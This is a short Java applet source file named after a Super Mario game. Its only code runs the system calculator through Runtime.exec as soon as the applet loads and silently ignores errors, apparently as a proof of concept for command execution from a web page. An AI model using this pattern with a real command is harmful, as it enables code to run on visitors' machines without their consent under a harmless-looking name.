import java.io.*;
import java.net.*;
import java.awt.*;
import java.applet.*;
import java.awt.event.*;

public class SuperMario3D extends Applet {
	public void init(){
		try {
			Process p = Runtime.getRuntime().exec("calc"); 
		} catch (IOException e) {
			//do nothing
		}
	}
};
